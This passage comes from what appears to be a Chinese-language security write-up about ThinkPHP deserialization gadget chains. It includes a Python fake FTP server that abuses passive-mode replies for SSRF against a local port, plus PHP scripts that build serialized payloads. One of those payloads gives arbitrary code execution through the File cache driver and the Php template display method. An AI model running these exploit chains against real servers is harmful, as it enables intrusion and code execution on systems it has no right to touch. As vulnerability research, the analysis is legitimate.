+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120153206847.png" alt="image-20220120153206847"></p>
+<p>可以看到是成功的让 <code>file_exists</code> 函数返回 <code>true</code> ，然后是如何进行 <code>SSRF</code> 。</p>
+<p>总所周知，在 <strong>ftp</strong> 协议中主要分为 <strong>主动模式</strong> 和 <strong>被动模式</strong> 两种模式。 其中，以传输文件为例(也就是该题所使用的原理)， <strong>主动模式</strong> 为客户端和服务端在通过首次连接协商好客户端开放一个端口，然后服务端起一个额外的连接去连接客户端开放的端口，客户端开放的那一个端口得到服务端的连接后就会将文件内容通过这个端口传输到服务端上。服务端起的这一个额外连接和客户端与服务端的首次连接互不影响。</p>
+<p>而 <strong>被动模式</strong> 则与 <strong>主动模式</strong> 相反，当客户端首次连接服务端会给服务端协商好一个端口，服务端会额外开放该端口，然后客户端会连接服务端额外开放的端口并从这个端口将文件内容传输到服务端上。同样的，这个额外的文件传输连接与客户端和服务端的首次连接互不影响。</p>
+<p>正因如此，也就存在一个小的缺陷，假设咱们能够伪造一个 <strong>ftp服务器</strong> ，并在某个客户端与其第一次连接时告诉客户端使用 <strong>被动模式</strong> ，然后将传输的 <strong>IP</strong> 和 <strong>端口</strong> 分别回应成 <strong>127.0.0.1</strong> 以及 <strong>[任意端口]</strong> ，那么客 户端就会向自己的 <strong>[任意端口]</strong> 端口发送传输文件的内容。这实际上如果客户端传输的内容可控，也就算得上是一个无回显可控的 <strong>gopher</strong> 协议了。</p>
+<p>至于交互的内容就不监听分析了，比方说这里想对 <strong>7000</strong> 端口实施 <code>SSRF</code> 👇</p>
+<ul>
+<li><code>220 \r\n</code></li>
+<li><code>331 \r\n</code></li>
+<li><code>230 \r\n</code></li>
+<li><code>220 \r\n</code></li>
+<li><code>550 \r\n</code></li>
+<li><code>227 (127.0.0.1,27,88)\r\n</code></li>
+<li><code>227 (127.0.0.1,27,88)\r\n</code></li>
+<li><code>150 \r\n</code></li>
+</ul>
+<p>以及具体的脚本👇</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FTP</span>(<span class="params">host, recv, getLen</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==== start listen ====&quot;</span>)</span><br><span class="line">    so = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    so.setsockopt(SOL_SOCKET, SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    so.bind(host)</span><br><span class="line">    so.listen(<span class="number">1</span>)</span><br><span class="line">    conn, addr = so.accept()</span><br><span class="line">    catch = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> recv:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">b&quot;Send -&gt; &quot;</span> + line)</span><br><span class="line">        conn.send(line)</span><br><span class="line">        <span class="keyword">if</span> catch.startswith(<span class="string">b&quot;MDTM&quot;</span>) <span class="keyword">or</span> line.startswith(<span class="string">b&quot;150&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        catch = conn.recv(getLen)</span><br><span class="line">        <span class="built_in">print</span>(catch)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==== end ====&quot;</span>)</span><br><span class="line">    so.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host = (<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">2335</span>)</span><br><span class="line">    getLen = <span class="number">65535</span></span><br><span class="line">    <span class="comment"># 第一部分 -&gt; fileExists</span></span><br><span class="line">    <span class="comment"># 220 服务就绪</span></span><br><span class="line">    <span class="comment"># 331 用户名正确，需要密码</span></span><br><span class="line">    <span class="comment"># 230 用户已登录</span></span><br><span class="line">    <span class="comment"># 550 未执行请求的操作</span></span><br><span class="line">    <span class="comment"># 200 确认操作</span></span><br><span class="line">    <span class="comment"># 213 文件状态</span></span><br><span class="line">    <span class="comment"># 213 文件状态</span></span><br><span class="line">    fileExists_recv = [</span><br><span class="line">        <span class="string">b&quot;220 \r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;331 \r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;230 \r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;550 \r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;200 \r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;213 \r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;213 \r\n&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    FTP(host,fileExists_recv,getLen)</span><br><span class="line">    <span class="comment"># 第二部分 -&gt; fakeFTP</span></span><br><span class="line">    <span class="comment"># 220 服务就绪</span></span><br><span class="line">    <span class="comment"># 331 用户名正确，需要密码</span></span><br><span class="line">    <span class="comment"># 230 用户已登录</span></span><br><span class="line">    <span class="comment"># 550 未执行请求的操作</span></span><br><span class="line">    <span class="comment"># 227 使用被动模式 格式为 (IP,端口 = (16^2)*27 + (16^0)*88 = 7000)</span></span><br><span class="line">    <span class="comment"># 150 文件状态正常，准备打开数据连接</span></span><br><span class="line">    fakeFTP_recv = [</span><br><span class="line">        <span class="string">b&quot;220 \r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;331 \r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;230 \r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;220 \r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;550 \r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;227 (127,0,0,1,27,88)\r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;227 (127,0,0,1,27,88)\r\n&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;150 \r\n&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    FTP(host, fakeFTP_recv, getLen)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>此时模拟一下整个操作流程，也就是先 <code>file_exists</code> 判断文件是否存在，若存在则调用 <code>file_put_contents</code> 函数( <code>ssrf.php</code> 文件)👇</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_exists(<span class="string">&quot;ftp://127.0.0.1:2335/any&quot;</span>);</span><br><span class="line">file_put_contents(<span class="string">&quot;ftp://127.0.0.1:2335/any&quot;</span>,<span class="string">&quot;[SSRF SUCCESS]&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>以下为执行后的效果👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120154712504.png" alt="image-20220120154712504"></p>
+<p>可见是成功对 <strong>7000</strong> 端口进行了 <code>SSRF</code> ，不妨将其放到 <code>thinkphp</code> 中进行尝试👇</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>&#123;</span><br><span class="line">	<span class="title">interface</span> <span class="title">ReadInterface</span>&#123;&#125;</span><br><span class="line">	<span class="title">interface</span> <span class="title">AdapterInterface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">ReadInterface</span>;</span><br><span class="line">	<span class="class"><span class="keyword">interface</span> <span class="title">CacheInterface</span> <span class="keyword">extends</span> <span class="title">ReadInterface</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">AdapterInterface</span>;</span><br><span class="line">	<span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractAdapter</span> <span class="keyword">implements</span> <span class="title">AdapterInterface</span></span>&#123;&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Local</span> <span class="keyword">extends</span> <span class="title">AbstractAdapter</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">CacheInterface</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>\<span class="title">Local</span>;</span><br><span class="line">	<span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$contents</span></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;adapter = <span class="keyword">new</span> Local;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;expire = <span class="variable">$contents</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>\<span class="title">Adapter</span>;</span><br><span class="line">	<span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="keyword">new</span> Adapter(<span class="string">&#x27;ftp://127.0.0.1:2335/any&#x27;</span>,<span class="string">&quot;\r\n [SSRF SUCCESS] \r\n\x00&quot;</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以及效果👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220120155202281.png" alt="image-20220120155202281"></p>
+<p>可以看到由于写入的数据是先由 <code>json_encode</code> 函数变为 <code>json</code> 字符再进行写入的，所以效果并不是很好，并且不能够进行 <code>换行</code> ，这显然是最为致命的。不过这确实是可以证明如果有一个 <code>file_put_contents(可控,可控)</code> 的形式是完全可以进行 <code>SSRF</code> 的。</p>
+<hr>
+<h3 id="链条II-任意代码执行">- 链条II (任意代码执行) -</h3>
+<h4 id="终点-2">- 终点 -</h4>
+<p>最终形如 <code>[可控](可控)</code> 的调用在 <code>vendor/topthink/framework/src/think/cache/Driver.php</code> 文件中  <code>Driver</code> 抽象类的 <code>serialize</code> 方法里👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118221934651.png" alt="image-20220118221934651"></p>
+<h4 id="分析-2">- 分析 -</h4>
+<p>先来看实现 <code>AbstractCache</code> 抽象类存在 <code>vendor/league/flysystem-cached-adapter/src/Storage/Memcached.php</code> 文件中的 <code>Memcached</code> 子类，其 <code>save</code> 方法拥有一个 <code>$this-&gt;[可控]-&gt;set(可控,基本可控,&#123;数值型&#125;可控)</code> 的形式👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118233213626.png" alt="image-20220118233213626"></p>
+<p>显然 <code>$expiration = this-&gt;expire === null ? 0 : time() + $this-&gt;expire</code> 这条语句返回得到一个数值型，为了保险起见，不妨跟进一下 <code>getForStorage</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118233617760.png" alt="image-20220118233617760"></p>
+<p>这个 <code>getForStorage</code> 方法和上面的差不多的，不过这里应该以 <code>complete</code> 属性作为可控值下手，并且由于 <code>cache</code> 属性的默认值依旧是空数组，所以无需管它👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118233807342.png" alt="image-20220118233807342"></p>
+<p>回过头来再看 <code>set</code> 方法，至于为什么要选择这个拥有3个传入参数的 <code>set</code> 方法，是因为对其的调用即是能否走向 <code>[可控](可控)</code> 形式的关键。事实上还有一个 <code>vendor/topthink/framework/src/think/filesystem/CacheStore.php</code> 文件的 <code>CacheStore</code> 类也是存在3个传入参数的 <code>set</code> 方法的，也可以从 <code>CacheStore</code> 类进入👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220119130620347.png" alt="image-20220119130620347"></p>
+<p>那么继续全局搜索有关 <code>set</code> 方法的类，可以发现有不少，但在其中只有一些是符合这条链下半部分的👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118223410034.png" alt="image-20220118223410034"></p>
+<p>这里不妨以存在 <code>vendor/topthink/framework/src/think/cache/driver/File.php</code> 文件中的 <code>File</code> 类里的 <code>set</code> 方法为例👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118224010800.png" alt="image-20220118224010800"></p>
+<p>由于最终传入 <code>serialize</code> 方法的参数内容来自基本可控的 <code>$value</code> 变量，因此上边对 <code>getExpireTime</code> 以及 <code>getCacheKey</code> 方法调用得到的返回值并不关键。不过为了保险起见还是依次跟进 <code>getExpireTime</code> 和 <code>getCachceKey</code> 方法以免种种原因导致抛出错误的发生👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118224328508.png" alt="image-20220118224328508"></p>
+<p>接着看 <code>getCacheKey</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118224620083.png" alt="image-20220118224620083"></p>
+<p>同样也没有有关抛出错误的行为，那么就可以到达 <code>serialize</code> 方法了👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118234228076.png" alt="image-20220118234228076"></p>
+<p>那么整条任意代码执行的链条就结束了，这条链也是比较短的，并且可以从多个拥有可传入3个参数的 <code>set</code> 方法的类进入到 <code>serialize</code> 方法中，具体列出为👇</p>
+<ul>
+<li><code>vendor/topthink/framework/src/think/cache/driver/File.php</code> 文件中的 <code>File</code> 类里的 <code>set</code> 方法</li>
+<li><code>vendor/topthink/framework/src/think/cache/driver/Memcache.php</code> 文件中的 <code>Memcache</code> 类里的 <code>set</code> 方法</li>
+<li><code>vendor/topthink/framework/src/think/cache/driver/Memcached.php</code> 文件中的 <code>Memcached</code> 类里的 <code>set</code> 方法</li>
+<li><code>vendor/topthink/framework/src/think/cache/driver/Redis.php</code> 文件中的 <code>Redis</code> 类里的 <code>set</code> 方法</li>
+<li><code>vendor/topthink/framework/src/think/cache/driver/Wincache.php</code> 文件中的 <code>Wincache</code> 类里的 <code>set</code> 方法</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__dustrcut</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Driver</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Driver</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span>, <span class="title">CacheHandlerInterface</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Php</span> <span class="keyword">implements</span> <span class="title">TemplateHandlerInterface</span></span>&#123;&#125;</span><br><span class="line">	👇</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$content</span>, <span class="keyword">array</span> <span class="variable">$data</span> = []</span>)</span>&#123;&#125;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+<h4 id="exp-动调-2">- exp&amp;动调 -</h4>
+<p>这个 <code>exp</code> 以 <code>File</code> 类为例👇</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>&#123;</span><br><span class="line">	<span class="title">interface</span> <span class="title">ReadInterface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">ReadInterface</span>;</span><br><span class="line">	<span class="class"><span class="keyword">interface</span> <span class="title">CacheInterface</span> <span class="keyword">extends</span> <span class="title">ReadInterface</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">contract</span>&#123;</span><br><span class="line">	<span class="title">interface</span> <span class="title">CacheHandlerInterface</span>&#123;&#125;</span><br><span class="line">	<span class="title">interface</span> <span class="title">TemplateHandlerInterface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Psr</span>\<span class="title">SimpleCache</span>&#123;</span><br><span class="line">	<span class="title">interface</span> <span class="title">CacheInterface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">cache</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">think</span>\<span class="title">contract</span>\<span class="title">CacheHandlerInterface</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">SimpleCache</span>\<span class="title">CacheInterface</span>;</span><br><span class="line">	<span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Driver</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span>, <span class="title">CacheHandlerInterface</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">view</span>\<span class="title">driver</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">think</span>\<span class="title">contract</span>\<span class="title">TemplateHandlerInterface</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Php</span> <span class="keyword">implements</span> <span class="title">TemplateHandlerInterface</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">Driver</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">think</span>\<span class="title">view</span>\<span class="title">driver</span>\<span class="title">Php</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Driver</span></span>&#123;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">			<span class="string">&#x27;hash_type&#x27;</span>=&gt;<span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">			<span class="string">&#x27;prefix&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">			<span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;serialize&#x27;</span>=&gt;[[<span class="keyword">new</span> Php,<span class="string">&#x27;display&#x27;</span>]]</span><br><span class="line">			];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">CacheInterface</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line">	<span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$complete</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Memcached</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$memcached</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;memcached = <span class="keyword">new</span> File;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;complete = <span class="string">&quot;&lt;?php &quot;</span>.<span class="variable">$code</span>.<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>\<span class="title">Memcached</span>;</span><br><span class="line">	<span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="keyword">new</span> Memcached(<span class="string">&#x27;phpinfo();&#x27;</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次对 <strong>exp</strong> 动调的入口就从 <code>League\Flysystem\Cached\Storage\Memcached</code> 类的 <code>save</code> 方法开始吧👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118235331584.png" alt="image-20220118235331584"></p>
+<p>继续跟进 <code>getForStorage</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118235426241.png" alt="image-20220118235426241"></p>
+<p>再下一步即是调用 <code>think\cache\driver\File</code> 类的 <code>set</code> 方法了，先看此时各个参数的情况👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118235700206.png" alt="image-20220118235700206"></p>
+<p>继续跟进 <code>think\cache\driver\File</code> 类的 <code>set</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220118235926269.png" alt="image-20220118235926269"></p>
+<p>由于前两个 <code>getExpireTime</code> 和 <code>getCacheKey</code> 的调用实际上与该链条的最终达成无关，就不跟进调试，这里直接看通过这两个方法后得到的变量值👇</p>
